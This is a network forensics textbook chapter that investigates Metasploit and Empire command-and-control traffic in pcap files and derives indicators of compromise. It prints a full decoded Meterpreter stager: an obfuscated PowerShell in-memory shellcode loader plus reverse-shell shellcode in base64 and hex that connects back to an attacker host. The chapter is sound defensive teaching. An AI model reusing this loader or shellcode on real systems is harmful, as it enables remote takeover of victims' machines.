<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Investigating C2 Servers</h1>
                </header>
            
            <article>
                
<p>In the last chapter, we saw how malware analysis works in the context of network forensics. Let's study some advanced and popularly-used <strong>Command and Control</strong> (<span><strong>C2</strong>)</span> tools to learn about their behavior on the wire and try to develop strategies to recognize them. The most popular tools for C2 are <strong>Metasploit</strong> and <strong>Empire</strong>, which are both used in red-teaming exercises and professional penetration tests. However, an easy-to-use choice can sometimes lure cyber criminals to use it as well. While many detection tools detect Metasploit usage, it is recommended that we go through a manual investigation of events as well.</p>
<p>In this chapter, we will look at the following topics:</p>
<ul>
<li>Decoding the Metasploit shell</li>
<li>Case study <span>–</span> decrypting the Metasploit Reverse HTTPS Shellcode</li>
<li>Empire C2 analysis</li>
<li>Case study <span>–</span> CERT.SE's major fraud and hacking criminal case, <strong>B 8322-16</strong></li>
</ul>
<p>Let's first investigate the basic reverse TCP shell used in Metasploit. We will examine the <kbd>meterpreter_basic.pcap</kbd> file for this exercise.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Technical requirements</h1>
                </header>
            
            <article>
                
<p>To complete the exercises in the chapter, you will require the following:</p>
<ul>
<li>VMWare Player/VirtualBox installation with Kali Operating system installed, You can download it from <a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</a></li>
<li>Wireshark v3.0.0 (<a href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a>) installed on Windows 10 OS/ Ubuntu 14.04 (already present in Kali Linux)</li>
<li>PowerShell (already present on Windows 10)</li>
<li>Python (already present on Kali Linux)</li>
<li>Download NetworkMiner from <a href="https://www.netresec.com/?page=Networkminer">https://www.netresec.com/?page=Networkminer</a></li>
<li>Download PCAP files for this chapter from <a href="https://github.com/nipunjaswal/networkforensics/tree/master/Ch7">https://github.com/nipunjaswal/networkforensics/tree/master/Ch7</a></li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Decoding the Metasploit shell</h1>
                </header>
            
            <article>
                
<p>Let's start investigating the file in Wireshark to try to deduce what happened. We will focus on gathering the following details:</p>
<ul>
<li>C2 server IP</li>
<li>C2 server port</li>
<li>Infected system IP</li>
<li>Infected system's port</li>
<li>Actions performed by the attacker</li>
<li>Time of the attack</li>
<li>Duration of the attack</li>
</ul>
<p>Let's fire up Wireshark and choose <strong>Statistics</strong> | <strong>Conversations</strong> | <strong>TCP</strong> tab:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/f6503b32-721e-461d-a392-0804b4037076.png"/></div>
<p>We can see that we have two conversations primarily between <kbd>192.168.46.128</kbd> and <kbd>192.168.46.129</kbd> on port <kbd>80</kbd> and <kbd>4433</kbd>. Let's filter the conversation using TCP as the filter and analyze the output:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/ed4f9d3a-4b4e-48ed-b755-6cca49ea8e9f.png" style="width:40.58em;height:15.25em;"/></div>
<p>We can see that the first TCP packets (<kbd>23</kbd>-<kbd>25</kbd>) are nothing but the three-way handshake. However, next, we have a separate conversation starting from packet <kbd>71</kbd>. Another strange thing is that the communication port being used is port <kbd>80</kbd>. However, for some reason, the data being displayed is still in TCP encapsulation and not in the application layer data (HTTP). This is strange and occurs in cases where port <kbd>80</kbd> is being used for non-HTTP communications. Let's right-click on packet <kbd>71</kbd> and follow the TCP stream:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/a0cb6e32-d1a6-4c25-b460-006850effa50.png" style="width:38.08em;height:30.58em;"/></div>
<p>Well, it looks as though we have our culprit! We can see a <kbd>dir</kbd> command being pushed and data being received. It is a case of C2 where the attacker might have executed the <kbd>dir</kbd> command and the response was sent to them. However, we have plenty of commands in the filtered streams. Additionally, the number of streams present in the <kbd>pcap</kbd> file is equal to the number of streams displayed in the TCP tab of the conversations. Hence, we know that there are four streams in the file, which are as follows:</p>
<ul>
<li>The three-way handshake</li>
<li>The setup for C2 on port <kbd>80</kbd></li>
<li>The <kbd>dir</kbd> command</li>
<li>Communication on port <kbd>4433</kbd></li>
</ul>
<p>While stream 2, which contains the <kbd>dir</kbd> command, is placed beneath stream 1, it was observed that stream 1 ended way after stream 2, as it was a continuous stream of a live shell.</p>
<p>Coming back to the commands in stream 1, the following command was executed:</p>
<pre><strong>cmd.exe /c "echo. | powershell get-host"&amp;echo STJEXrMKAkjOshArBckoeWYztVtWXdpt</strong>  </pre>
<p>The preceding command runs <kbd>get-host</kbd> from PowerShell, which displays the following output:</p>
<pre>    <strong>Name : ConsoleHost</strong>
    <strong>Version: 2.0</strong>
    <strong>InstanceId : 12db3119-6933-4952-926a-b57f6d910559</strong>
    <strong>UI: System.Management.Automation.Internal.Host.InternalHostUserI</strong>
    <strong>nterface</strong>
    <strong>CurrentCulture : en-US</strong>
    <strong>CurrentUICulture : en-US</strong>
    <strong>PrivateData: Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</strong>
    <strong>IsRunspacePushed: False</strong>
    <strong>Runspace: System.Management.Automation.Runspaces.LocalRunspace</strong>
    
    
    
    <strong>STJEXrMKAkjOshArBckoeWYztVtWXdpt</strong>
  </pre>
<p>We can also see an identifier being echoed in the command. This identifier is generally used to identify unique output from a compromised host while also denoting the end of the output. Let's look at the next command:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/7a6adfde-cbdf-4c42-85ac-5bbd7d8b15c1.png"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Working with PowerShell obfuscation</h1>
                </header>
            
            <article>
                
<p>The <kbd>%COMSPEC%</kbd> command is nothing but a placeholder variable for <kbd>cmd.exe</kbd>, and we can verify this by typing <kbd>echo %COMSPEC%</kbd> in CMD. Next, we can see that <kbd>powershell.exe</kbd> is being invoked in minimized and through a hidden window using the <kbd>/min</kbd> and <kbd>-w hidden</kbd> switches. In the following lines, PowerShell is being searched from system32 and 64-bit directories, such as <kbd>sysWOW64</kbd>. Let's decode the base64-encoded payload to see what lies beneath:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/4b4989e8-5c4d-41e1-8f69-4416c6fb9a3d.png"/></div>
<p>We get the preceding output after base64 decoding. However, it still does not make much sense. We can see another base64 encoded string and Gzip compression objects in the output. Let's try decompressing the Gzip compression and decoding it using base64 in the next section</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Decoding and decompressing with Python</h1>
                </header>
            
            <article>
                
<p>Let's drill deeper. Let's use Python to decode the contents, which are Gzip compressed and base64-encoded:</p>
<pre><strong>&gt;&gt;&gt; import io 
&gt;&gt;&gt; import base64 
&gt;&gt;&gt; import gzip 
&gt;&gt;&gt; file_content = io.BytesIO(base64.b64decode("H4sIAJrUfFwCA7VW+2/aSBD+OZX6P1gVkm3V4RFoeskp0q15muIEYh4hFEUbe22WrL2wXodHr//7jQEn6TWt2pPOArGenZmd+b6ZWRyJhTx2GCEL5ThWSn/6SeRKyiMF90fdovLl7ZujLhY4VLSce2coue3ppqYfHYE4R/iH7h/KhaJN0GJR4yGm0fT8vJoIQSK5f883iURxTMJ7Rkms6crfymhGBDm+up8TVypflNxdvsn4PWYHtU0VuzOiHKPIS/c63MVpOHlnwajU1M+fVX1yXJrm68sEs1hTnU0sSZj3GFN15aueHtjfLIim2tQVPOa+zI9oVD7JD6IY++QSvD0Sm8gZ92JVhzTgI4hMRKTsE0o97Pc1FZZdwV3keYLEoJ63okf+QLRclDBmKH9pk8Px10kkaUhgXxLBFw4Rj9Qlcb6FI4+Ra+JPtUuyyrL+VSPtpRFodaXQDSDitTht7iWM7E1V/ftIgT0dnoxByPzr2zdv3zzRzSovuYbV0WS3JhCb1uUx3WldKEVDseEQLLnYwGuuLxKiT5VJCvpkOlVyi/4dMn5sX8qUQXXZBcFkyKk3BYMDGbnYvFun8h8XVY34NCK1TYRD6mZ1o72GMPEZ2eWXz9QuISRNPWwQr0YYCbBMITOUyfdm9ZDKJ1szocwjArnAUgxRAYH6t8HsWdBUK7JJCAjt31VA3YdqJZn2oUI32enpOyipVYbj2FC6CbSLaygOwYx4hoKimB62UCL5bqk+h2snTFIXxzJzN9UzHA/nVXkUS5G4QBrk3ncWxKWYpVAYSot6xNw4NMjOVV8FoooZo1EAnh6BCJCkADgyLQUBIe5o1/MOkVa4YCQEnV3fNhgOoEsPpb6rHRwQT/13hFkl78s2xSID4UV8QLDDuDSUIRUS2j/Fddn9b4e/aPtdGFVBDkRoWW9MzI1Mazo33662abFnsOxAEBIAaAgemjgmpxVHCoBHe1e4olUEz9iKmO2aD7SEVrRk2fAd0LLFax+9T+15qyBq65mPrNiyW91ar9WqPLadYUU6dUt+6lrSrt/M5w5qXQ/G8tZCrT4tPowr20Wbbp0O8sbrwunW3K6K5no7Dzx/XPP94KPvXJc+NGhnVO2ZxRPcqdWTzshcmcVKXKerVo8Oeg/thrwfDxke+IXgpnSG6boj5sMSt7cWQs1Z2d22/WFzZnubcYuSeaHYoT3UQ+iTez0YNINF0IxR4Wy4rIZztKyemhhZqD5stj8wszdomGhQN3v4infL72uF0q23rDdub3A7ZF6zVSiNb5CHtoV+MCt9bM5XErdHqS/U5PUh8ziSkXVTKAzp9nbZawaoDjgOQ45wgz4M3t+Av8s+DszRoPSsi1x7sY5uktXq4uJdSiwwm6Ol8gu6fjRnbSziGWZAI8zPrHcaXDQOM7HLaWqhafur8IGIiDC4SeCuySoQMcbddCbD+ITbYD+jp9BAA1iWT15d6cqTov48qDPR+fktBAk1vSu6fIdEgZwZxXW5WITRW1xXipDkr2dW5YuNtvdlpLM7hebJOds519Naz8Vn/zNihwabwY/3c8SeZT/Z/SUUi8Yu3++k3wp+C9DfT3yEqQRVB8YDI/v76bX8D8Xx4uqOz4B3//Ckf52uEnl8Cff5P9ds5qy1CQAA")) 
&gt;&gt;&gt; result = gzip.GzipFile(fileobj=file_content) 
&gt;&gt;&gt; result.read()</strong> </pre>
<p>We start by importing the input/output, Gzip, and base64 libraries. Next, we decode the content using base64 and obtain the decoded bytes. The decoded bytes are in Gzip compression and hence need decompression. We Gzip the contents and store the results in the result variable, and then we print the data:</p>
<pre><strong>Start-Sleep -s 1;function aTWP0 { 
   Param ($c_, $z6yD)        
   $eo5P8 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(\'\\\\\')[-1].Equals(\'System.dll\') }).GetType(\'Microsoft.Win32.UnsafeNativeMethods\') 
    
   return $eo5P8.GetMethod(\'GetProcAddress\').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($eo5P8.GetMethod(\'GetModuleHandle\')).Invoke($null, @($c_)))), $z6yD)) 
} 
 
function l4 { 
   Param ( 
         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $pT_A, 
         [Parameter(Position = 1)] [Type] $qP = [Void] 
   ) 
    
   $sB_x = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(\'ReflectedDelegate\')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(\'InMemoryModule\', $false).DefineType(\'MyDelegateType\', \'Class, Public, Sealed, AnsiClass, AutoClass\', [System.MulticastDelegate]) 
   $sB_x.DefineConstructor(\'RTSpecialName, HideBySig, Public\', [System.Reflection.CallingConventions]::Standard, $pT_A).SetImplementationFlags(\'Runtime, Managed\') 
   $sB_x.DefineMethod(\'Invoke\', \'Public, HideBySig, NewSlot, Virtual\', $qP, $pT_A).SetImplementationFlags(\'Runtime, Managed\') 
    
   return $sB_x.CreateType() 
} 
[Byte[]]$jzwzy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqC6BaAIAEVGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==") 
          
$i13 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aTWP0 kernel32.dll VirtualAlloc), (l4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $jzwzy.Length,0x3000, 0x40) 
[System.Runtime.InteropServices.Marshal]::Copy($jzwzy, 0, $i13, $jzwzy.length) 
 
$s9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aTWP0 kernel32.dll CreateThread), (l4 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$i13,[IntPtr]::Zero,0,[IntPtr]::Zero) 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aTWP0 kernel32.dll WaitForSingleObject), (l4 @([IntPtr], [Int32]))).Invoke($s9,0xffffffff) | Out-Null'</strong> </pre>
<p>We can see that we have decoded the entire payload and what we have is what looks like a reflective DLL injection. However, we can still see another base64-encoded string. Let's decode it as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/46221b7b-845d-4eb5-8a17-77c2cdbf49d0.png"/></div>
<p>We can see the decoded values; this is the shellcode used by the attacker. Let's convert it into hex strings:</p>
<pre><strong>&gt;&gt;&gt;import base64 
&gt;&gt;&gt;base64.b64decode("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqC6BaAIAEVGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==").hex()</strong> </pre>
<p>The preceding program outputs the following:</p>
<pre><strong>fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a68c0a82e81680200115189e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c675eec3 </strong></pre>
<p>We can view the preceding string in the form of shell code, as follows (there is an excellent web resource that converts hex string to x86 assembly: <a href="https://defuse.ca/online-x86-assembler.htm">https://defuse.ca/online-x86-assembler.htm</a>):</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/e0a3a1e2-d269-4aa8-8462-4e3c3269b0c0.png" style="width:37.08em;height:42.92em;"/></div>
<p>Scrolling down the code, we have a few interesting lines that show the following:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/e97ae046-df1e-45f8-af9c-767cd006e509.png" style="width:23.08em;height:7.33em;"/></div>
<p>At line <kbd>af</kbd> (line 4), we have <kbd>push 0x812ea8c0</kbd>, which is in big-endian format. Let's convert this into endian format by reversing the bytes as <kbd>c0a82e81</kbd>. Converting this from a hex to an IP address, we have <kbd>192.168.46.129</kbd> and similarly for the next line, <kbd>51110002</kbd> whose first half in the little-endian format is the port which is <kbd>1151</kbd> (hex) to <kbd>4433</kbd>(decimal).</p>
<p><kbd>4433</kbd> is the port being communicated to in the stream 3 of the network capture file. Additionally, if we look at the assembly in detail, we will find that the shellcode is used to connect back to the IP and port defined and gave the attacker some access to the target. Looking at the assembly is beyond the scope of this book. Hence, please check out the <em>Further reading</em> section if you want to learn more about assembly.</p>
<p>So, do we have the answers to all the questions in the beginning? Let's see:</p>
<ul>
<li><strong>C2 server IP</strong>: <kbd>192.168.46.129</kbd></li>
<li><strong>C2 server port</strong>: <kbd>80</kbd> (shell), <kbd>4433</kbd> (unknown)</li>
<li><strong>Infected system IP</strong>: <kbd>192.168.46.128</kbd></li>
<li><strong>Infected system's port</strong>: <kbd>49273</kbd>, <kbd>49724</kbd>, and others</li>
<li><strong>Actions performed by the attacker</strong>:
<ul>
<li>The attacker gained shell access to the system when the user executed some malicious file from the desktop.</li>
<li>The attacker ran the <kbd>dir</kbd> command on the target and harvested the list of items in the current directory.</li>
<li>The attacker executed PowerShell and ran <kbd>get-host</kbd> for console host information.</li>
<li>The attacker ran another PowerShell script, which executed a highly obfuscated payload, which connected to the attacker's system on port <kbd>4433</kbd> and provided the attacker with some form of access:
<ul>
<li><strong>Time of the attack</strong>: 13:01:13</li>
<li><strong>Duration of the attack</strong>: 2:44 minutes (capture file properties)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p class="mce-root"><span>Let's now view stream 3:</span></p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/8b4b760d-bef2-47f4-bb02-b5e419bd018b.png"/></div>
<p class="mce-root"/>
<p>When we filter to stream 3 and follow the stream, we get the preceding output, which looks like an executable, since the first few bytes contain the MZ magic byte, which is the default for executables and DLLs. Let's look further:</p>
<div class="CDPAlignCenter CDPAlign"><img class="alignnone size-full wp-image-1093 image-border" src="assets/4de185d0-90ca-4ec3-821a-96903ca05f39.png" style="width:102.58em;height:71.75em;"/></div>
<p>Scrolling down a bit, we can see numerous functions that denote common Metasploit keywords, such as <strong>Type Length Value</strong> (<strong>TLV</strong>)-based identifiers. The Meterpreter backdoor uses <span>TLV<strong> </strong></span>communications.</p>
<p>Additionally, we have a variety of WIN API functions. This file is the Meterpreter DLL file being injected into the target's calling process on runtime. Hence, <em>some form of access</em> in the answered questions section is a Meterpreter access to the target. Looking further, we can see that the entire communication is encrypted, which is a common property of Meterpreter.</p>
<p>To sum up this investigation, we have the following key points:</p>
<ul>
<li>The attacker had shell access to the target system after connecting.</li>
<li>The attacker ran the <kbd>dir</kbd> command on the <kbd>Desktop</kbd> folder. Hence, the culprit file allowing the attacker access is present on the desktop.</li>
<li>The attacker ran a PowerShell command that contained a highly obfuscated payload.</li>
<li>The payload contained the attacker's IP and port <kbd>4433</kbd> to connect to the attacker. This mechanism looks like an update to the existing shell, which is a feature in Metasploit where you can update your shell to a Meterpreter shell.</li>
<li>Meterpreter DLL was downloaded to the victim system, and the connection was initiated on stream 3.</li>
</ul>
<p>We deduced a lot in this exercise only using network evidence along with some help from Python and a few reference websites. Additionally, we saw how we can decode and decompress obfuscated payloads sent on the network. Let's see how we can work with HTTPS enabled payloads for Metasploit in the next section.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Case study – decrypting the Metasploit Reverse HTTPS Shellcode</h1>
                </header>
            
            <article>
                
<p>It is practically impossible to decrypt the HTTPS communication without using a man-in-the-middle or some sorts of SSL offloader. In the case of a Meterpreter shell, the key and certificates are dynamically generated and are then removed, making it more difficult to decrypt the encrypted sessions. However, sometimes a malicious attacker may use and impersonate SSL certificates and leave them on their system. In such cases, obtaining the private key can decrypt the HTTPS payloads for us. The following example demonstrates the SSL decryption in cases of a self-signed certificate and we are assuming that the incident responders somehow managed to grab the keys from the attackers system. Let's look at the encrypted communication given in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/a5ecfb70-0955-4d9f-9f52-9187541d2719.png"/></div>
<p>We can see that the data is encrypted and there is not much that is making sense. Let's open this <kbd>meterpreter_https.pcap</kbd> file in NetworkMiner and browse to the <strong>Files</strong> tab:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/43bbd7f5-58d4-4a7e-9514-1c36b27c61a8.png"/></div>
<p class="mce-root"/>
<p>We can see that the communication contains the certificate, which has failed its authenticity. While we are trying to decrypt the contents of the encrypted Meterpreter session, and it should be noted that in most cases the private key will not be available for us to use. In such scenarios, we will be making use of red flags, such as these which is a failed authenticity on SSL certificate, to determine whether the communication channel is malicious. Next, let's try to decrypt the encrypted communication:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/33503da0-2784-42ec-af4f-dd9db2ed3d66.png"/></div>
<p>We will go to the <strong>Protocols</strong> section from <strong>Preferences</strong>, navigate to <strong>SSL</strong>, and click the <strong>RSA keys list</strong> option, which will populate the following:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/b9e6b831-377d-47d7-8212-f798651ebf42.png" style="width:28.42em;height:13.50em;"/></div>
<p>As soon as we populate the <strong>SSL Decrypt</strong> section with the IP address, port number, and key file, we will see the decrypted data:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/26ac8f0a-8b9d-4aa4-a7a4-60379d51ff0a.png"/></div>
<p>We can see that we now have decrypted data in Wireshark. Since we are working with the decrypted SSL session, the analysis would also apply to HTTP payloads. The Meterpreter HTTP payload uses beaconing, like any other C2 systems. In the case of HTTP, they are merely GET requests that generate a response of length zero. If we look closely, we will see that these responses have a content length of zero:</p>
<div class="CDPAlignCenter CDPAlign"><img class="alignnone size-full wp-image-1071 image-border" src="assets/f10b1a10-2877-4722-9d36-cb024f2f51ec.png" style="width:50.58em;height:40.33em;"/></div>
<p>Another thing to take note of here is that the responses only contain <strong>Apache</strong>, which is a non-standard HTTP header and don't look normal since its not containing the exact version of Apache Server. While these are some of the red flags in the communication, they are non-exhaustive, and you should continue your research to discover more.</p>
<p>Coming back to our original discussion regarding how we decrypt the SSL sessions, we have the following:</p>
<ul>
<li>We somehow grab the SSL key from the attacker</li>
<li>We modify the attacker's instance of Metasploit and log their keys</li>
<li>We modify the attacker's instance of Metasploit and provide a static key and cert</li>
<li>We do a man-in-the-middle attack</li>
</ul>
<div class="packt_tip">Check out this great post on run-time Meterpreter key analysis to modify keys and CERT on the attacker's system: <a href="https://khr0x40sh.wordpress.com/2013/06/25/exporting-runtime-private-key-for-msfs-meterpreter-reverse-tcp-and-https/">https://khr0x40sh.wordpress.com/2013/06/25/exporting-runtime-private-key-for-msfs-meterpreter-reverse-tcp-and-https/</a>.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Analyzing Empire C2</h1>
                </header>
            
            <article>
                
<p>Empire is a pure PowerShell post-exploitation agent and provide features similar to a Metasploit Meterpreter Similar to the <strong>Indicators of Compromise</strong> (<strong>IOC</strong>) observed in Metasploit, the Empire C2 have varying  IOCs. Let's analyze the <kbd>empire_shell.pcap</kbd> file and load it up in Wireshark to view the properties of <kbd>pcap</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/930c9675-b223-42dd-8bd4-7d1391a9704f.png" style="width:40.92em;height:27.25em;"/></div>
<p>The capture file contains traffic analysis for over three-and-a half hours. Let's look at the traffic conversations:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/a93ac356-0d00-495b-a577-e9d4d789d5b0.png"/></div>
<p>We can see a clear pattern here, which denotes beaconing, as we can see that the number of packets is quite static, having the value <kbd>5</kbd> for most of the 2,649 conversations. The systems infected with Empire tend to generate a ton of HTTP requests. Let's filter some of the HTTP requests using HTTP contains <kbd>GET</kbd> filter and see what's under the hood:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/cebf77fa-cfef-4eb8-be96-3f8c31e6cd1a.png"/></div>
<p>The attackers can easily modify the preceding URI entries. However, for an inexperienced adversary, these values would be default, as shown in the preceding screenshot. The three URIs—<kbd>/admin/get.php</kbd>, <kbd>/login/process.php</kbd>, and <kbd>news.php</kbd>—define the entire communication control for Empire. Let's dig deeper into one of the requests:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/37debd22-6bf9-40da-aacc-b516bf84f1e2.png"/></div>
<p class="mce-root"/>
<p>While recording the preceding pcap, the target used was a Windows 10 box. However, as per the request generated, the user-agent states that the requesting system is Windows 7 (Windows NT 6.1). Additionally, the server headers in the response state that the server is Microsoft-IIS/7.5, while the <kbd>It works!</kbd> message in the response body looks like the one used by Apache Server (default <kbd>index.html</kbd> page for Apache Server).</p>
<div class="packt_tip"><span>The TTL value </span>can<span> also unveil a good amount of detail, such as a TTL value of </span><kbd>64</kbd><span> to denote a Linux system, while Windows-based OSes use </span><kbd>128</kbd><span> as the </span>default<span> TTL value.</span><br/>
Refer to this table of TTL values for more information: <a href="https://subinsb.com/default-device-ttl-values/">https://subinsb.com/default-device-ttl-values/</a><span class="URLPACKT">.</span></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Case study – CERT.SE's major fraud and hacking criminal case, B 8322-16</h1>
                </header>
            
            <article>
                
<p>Refer to the case study at <a href="https://www.cert.se/2017/09/cert-se-tekniska-rad-med-anledning-av-det-aktuella-dataintrangsfallet-b-8322-16">https://www.cert.se/2017/09/cert-se-tekniska-rad-med-anledning-av-det-aktuella-dataintrangsfallet-b-8322-16</a>. We can download the PCAP file from <a href="https://drive.google.com/open?id=0B7pTM0QU5apSdnF0Znp1Tko0ams"><span class="URLPACKT">https://drive.google.com/open?id=0B7pTM0QU5apSdnF0Znp1Tko0ams</span></a>. The case highlights the use of open source tools and denotes that the infection took place after the targets received an email along with a macro-enabled document. The attackers asked the victims to enable macros to view the content of the document and hence generated a foothold on the target system. We will examine the <kbd>pcap</kbd> from the network's point of view and highlight the information of interest.</p>
<p>Let's fire up the NetworkMiner and get an overview of what happened:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/df10efb0-dff9-48ea-aa68-d4da1172558a.png"/></div>
<p>If we sort the packets with bytes, we have <kbd>37.28.155.22</kbd> as the top IP address. Let's view its details:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/1ebd0220-601c-40ce-93da-dd9c55f654b1.png" style="width:33.50em;height:23.17em;"/></div>
<p>We can see that the system is Linux and, as mentioned, it has a TTL value of <kbd>64</kbd>. The open ports on this system are <kbd>8081</kbd> and <kbd>445</kbd>. Let's fire up Wireshark to investigate this IP:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/7d31cc25-d96e-4d92-bf47-0bbec0600c09.png"/></div>
<p>We can see that 92% of the traffic belongs to <kbd>37.28.155.22</kbd> as highlighted in the preceding screenshot. Let's see some of the HTTP data:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/9f97ae29-a7d8-4539-ad25-39c58dfcf693.png"/></div>
<p>Well! It looks as though the Empire framework has been used here. Let's confirm our suspicion by investigating one of the packets:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/22177d26-1263-4f97-9018-e17e40d99699.png"/></div>
<p>As we discussed earlier, and saw in NetworkMiner, the <kbd>37.28.155.22</kbd> IP is a Linux server with a TTL value of <kbd>64</kbd>. The preceding request does not make sense, since it states that the server is running Microsoft IIS 7.5 and has the same request signature as Windows 7. The communication is from Empire. However, the attackers have modified some of the pages, such as <kbd>news,php</kbd> and <kbd>news.asp</kbd>. We can also see encrypted data flowing:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/7b4a324c-9831-480b-879c-37eed1c3600f.png"/></div>
<p>We just saw how tools such as Empire were used to commit a real-world crime. Hence, it's always good to know the IOCs for the same.</p>
<p>So to sum up this investigation, we have the following details:</p>
<ul>
<li><strong>C2 server IP</strong>: <kbd>37.28.155.22</kbd></li>
<li><strong>C2 server Port</strong>: <kbd>8081</kbd></li>
<li><strong>Infected system IP</strong>: <kbd>195.200.72.148</kbd></li>
</ul>
<div class="CDPAlignCenter CDPAlign"><img src="assets/5c0af383-0242-4496-b29c-20c158bb7c4c.png" style="width:41.25em;height:43.58em;"/></div>
<div class="packt_figure packt_figref CDPAlignCenter CDPAlign">Infected system's port</div>
<ul>
<li><strong>Actions performed by the attacker</strong>:
<ul>
<li>The attacker gained shell access to the system when the user executed a malicious document that contained macros (source: Case Study).</li>
<li>The attacker gained access via Empire on port <kbd>8081</kbd> of their C2 server (source: PCAP).
<ul>
<li><strong>Time of the attack</strong>: Sep 14, 2017, 13:51:14.136226000 India Standard Time (packet arrival time)</li>
<li><strong>Duration of the attack</strong>: 21 minutes+ (Capinfos/Statistics | Capture File Properties)</li>
</ul>
</li>
</ul>
</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p style="color: black">In this chapter, we saw how to decode encoded payloads for Metasploit and make sense of the evidence captured from the network itself. We saw how an attacker migrates from a normal reverse shell to a Meterpreter shell on the packet level. We looked at a variety of techniques to decrypt encrypted Meterpreter communication. We also saw how Empire works and learned its indicators of compromise while applying it to a real-world case study. In this chapter, we relied on pcap-enabled data.</p>
<p>In the next chapter, we will look at how we can use log-based data to solve real-world cases.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Questions and exercises</h1>
                </header>
            
            <article>
                
<p>Answer/solve the following questions and exercises based on material covered in this chapter:</p>
<ol>
<li>Repeat the exercises covered in this chapter</li>
<li>Try decoding other samples from the <kbd>Challenges</kbd> directory on GitHub (<a href="https://github.com/nipunjaswal/networkforensics/tree/master/Challenges">https://github.com/nipunjaswal/networkforensics/tree/master/Challenges</a>)</li>
